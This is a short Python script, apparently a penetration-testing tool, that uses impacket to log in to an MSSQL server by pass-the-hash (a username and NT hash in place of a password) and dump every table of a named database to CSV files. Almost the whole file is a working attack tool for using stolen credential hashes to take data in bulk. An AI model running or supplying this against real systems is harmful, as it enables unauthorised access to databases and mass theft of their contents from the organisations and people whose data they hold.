'''
Used to login to MSSQL servers and dump all of their tables in csv format from a specific database.
Used when you do not have plain credentials but instead have a username and a hash.


To be improved in the future.

'''

from impacket.tds import MSSQL
from impacket import version
import pandas
import csv
import sys



if __name__ == '__main__':
    if len(sys.argv) != 6:
        print(f"Usage: {sys.argv[0]} <target> <domain> <user> <nthash> <dbname>")
        sys.exit(1)

    target, domain, user, nthash, dbname = sys.argv[1:]
    
    mssql = MSSQL(target, 1433)

    mssql.connect()

    mssql.login(
        database=None,
        username=user, 
        domain=domain,
        hashes=f":{nthash}",
        useWindowsAuth=True)

    mssql.changeDB(dbname)
    
    tables = mssql.sql_query("SELECT name from sys.tables;")
    if len(tables) > 0:
        pass
    else:
        print("No tables in",dbname)
        exit()


    df = pandas.DataFrame(data=tables)
    print(df)
    tableNames = None

    for (columnName, columnData) in df.items():
        tableNames = columnData.values

    for t in tableNames:
        _df = pandas.DataFrame(mssql.sql_query(f"SELECT * from {t};"))
        _df.to_csv(f'{dbname}__{t}.csv')

    mssql.disconnect()